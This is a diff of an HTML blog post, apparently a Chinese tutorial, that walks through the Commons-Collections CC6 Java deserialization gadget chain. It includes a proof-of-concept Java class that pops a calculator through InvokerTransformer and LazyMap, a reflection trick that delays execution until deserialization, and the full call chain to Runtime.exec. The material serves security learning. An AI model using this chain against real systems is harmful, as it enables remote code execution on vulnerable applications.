@@ -302,7 +302,7 @@
 </blockquote>
 <p>CC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链</p>
 <h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><ul>
-<li><a class="link"   target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html" >Jdk 8u71<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Jdk 8u71<i class="fas fa-external-link-alt"></i></a></li>
 <li>Comoons-Collections 3.2.1</li>
 </ul>
 <p>大致的搭建思路可以参照我之前的文章 <a href="https://drun1baby.github.io/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E7%AF%8701-CC1%E9%93%BE/#toc-heading-2">Java反序列化CommonsCollections篇01-CC1链环境搭建</a></p>
@@ -311,12 +311,12 @@
 </ul>
 <p>然后我们还是找其他调用 <code>get()</code> 方法的地方，我也不知道这是怎么找出来的，因为 <code>get()</code> 方法如果 find usages 会有很多很多方法，可能这就是 Java 安全卷的原因吧。</p>
 <h3 id="1-寻找尾部的-exec-方法"><a href="#1-寻找尾部的-exec-方法" class="headerlink" title="1. 寻找尾部的 exec 方法"></a>1. 寻找尾部的 exec 方法</h3><p>尾部的链子还是 CC1 链中，我们用到的那个 <code>InvokerTransformer</code> 的方法，前一段链子是和 CC1 链是一样的。</p>
-
+<img src="/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/SameChains.png" class>
 
 <h3 id="2-找链子"><a href="#2-找链子" class="headerlink" title="2. 找链子"></a>2. 找链子</h3><ul>
 <li>根据 ysoSerial 官方的链子，是 <code>TiedMapEntry</code> 类中的 <code>getValue()</code> 方法调用了 <code>LazyMap</code> 的 <code>get()</code> 方法。</li>
 </ul>
-
+<img src="/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/TiedMapEntryChains.png" class>
 
 <p>这里先重新写一遍 LazyMap 类调用计算器的 EXP，这种 EXP 是不嫌多的，多写一写能让自己更加熟练。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 用 decorate 触发弹计算器，确保此链可用  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"> <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>  </span><br><span class="line"> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"> <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  </span><br><span class="line"> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line"> <span class="type">Method</span> <span class="variable">lazyGetMethod</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line"> lazyGetMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> lazyGetMethod.invoke(decorateMap, runtime);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -329,19 +329,19 @@
 <ul>
 <li>成功弹出计算器</li>
 </ul>
-
+<img src="/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/TiedMapEntryEXP.png" class>
 
 <blockquote>
 <p>这里的逻辑还是很简单的，直接 new 一个 <code>TiedMapEntry</code> 对象，并调用它的 <code>getValue()</code> 方法即可，它的 <code>getValue</code> 方法会去调用 <code>map.get(key)</code> 方法。</p>
 </blockquote>
-
+<img src="/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/getValue.png" class>
 
 <p>现在我们确保了 <code>TiedMapEntry</code> 这一段链子的可用性，往上去找谁调用了 <code>TiedMapEntry</code> 中的 <code>getValue()</code> 方法。</p>
 <ul>
 <li>寻找的方法也略提一嘴，因为 <code>getValue()</code> 这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况。</li>
 </ul>
 <p>寻找到同名函数下的 <code>hashCode()</code> 方法调用了 <code>getValue()</code> 方法。</p>
-
+<img src="/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/hashCode.png" class>
 
 <p>如果我们在实战里面，在链子中找到了 <code>hashCode()</code> 方法，说明我们的构造已经可以<strong>“半场开香槟”</strong>了，</p>
 <h3 id="3-与入口类结合的整条链子"><a href="#3-与入口类结合的整条链子" class="headerlink" title="3. 与入口类结合的整条链子"></a>3. 与入口类结合的整条链子</h3><ul>
@@ -369,11 +369,11 @@
 <h3 id="4-解决在序列化的时候就弹出计算器的问题"><a href="#4-解决在序列化的时候就弹出计算器的问题" class="headerlink" title="4. 解决在序列化的时候就弹出计算器的问题"></a>4. 解决在序列化的时候就弹出计算器的问题</h3><ul>
 <li>参考 URLDNS 链中的思想，先在执行 <code>put()</code> 方法的时候，先不让其进行命令执行，在反序列化的时候再命令执行。</li>
 </ul>
-<p><font color=red>此处强烈建议师傅们去打断点好好理解一下！</font></p>
+<p><font color="red">此处强烈建议师傅们去打断点好好理解一下！</font></p>
 <p>我在打完断点后分析出来的原因是这样的：</p>
 <p>与 URLDNS 中的不同，有些链子可以通过设置参数修改，有些则不行。在我们 CC6 的链子当中，通过修改这一句语句 <code>Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</code>，可以达到我们需要的效果。</p>
 <p>我们之前传进去的参数是 <code>chainedTransformer</code>，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回 <code>chainedTransformer</code>。相关的属性值在 LazyMap 当中为 <code>factory</code></p>
-
+<img src="/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/ReflectChangeFactory.png" class>
 
 <ul>
 <li>修改如下</li>
@@ -389,10 +389,10 @@
 <p>“<br>这里在 25 行，也就是 <code>HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();</code> 这里打断点，会发现直接 24 行就弹计算器了，不要着急，这里是一个 IDEA 的小坑，后续会讲。<br>”</p>
 </blockquote>
 <h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><p>因为在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 <code>toString()</code> 方法，所以在创建 <code>TiedMapEntry</code> 的时候，就自动调用了 <code>getValue()</code> 最终将链子走完，然后弹出计算器。</p>
-<h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4>
+<h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><img src="/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/toStringAuto.png" class>
 
 <p>在 IDEA 的偏好设置当中如图修改即可。</p>
-
+<img src="/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/toStringForbid.png" class>
 
 <h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><ul>
 <li>老样子，我们还是需要画个流程图总结一下链子。</li>
@@ -401,7 +401,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">	HashMap.put()</span><br><span class="line">	HashMap.hash()</span><br><span class="line">		TiedMapEntry.hashCode()</span><br><span class="line">		TiedMapEntry.getValue()</span><br><span class="line">			LazyMap.get()</span><br><span class="line">				ChainedTransformer.transform()</span><br><span class="line">					InvokerTransformer.transform()</span><br><span class="line">						Runtime.exec()</span><br></pre></td></tr></table></figure>
 
 <p>再是我们的流程图</p>
-
+<img src="/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/CC6.png" class>
 
 <blockquote>
 <p>再提一嘴，CC6 链被称为最好用的 CC 链，是因为其不受 jdk 版本的影响，无论是 jdk8u65，或者 jdk9u312 都可以复现。</p>
